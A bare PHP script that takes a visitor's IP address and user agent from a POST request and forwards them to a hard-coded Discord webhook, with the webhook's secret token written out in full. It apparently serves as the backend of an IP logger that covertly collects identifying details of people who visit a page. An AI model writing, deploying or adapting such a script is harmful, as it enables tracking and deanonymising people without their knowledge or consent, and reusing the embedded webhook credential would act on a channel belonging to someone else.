<?php
$ip = $_POST['ip'];
$user_agent = $_POST['user_agent'];

$url = 'https://discord.com/api/webhooks/1116840690811412623/ljBC7BcAaKj4orxzDFcJvID4CSF5Q7Sir3678YqqrAl-I9w3EtXW7cbTpScp7144Elxr';
$data = array('content' => "IP address: $ip\nUser agent: $user_agent");
$options = array(
    'http' => array(
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data),
    ),
);
$context  = stream_context_create($options);
$result = file_get_contents($url, false, $context);
?>
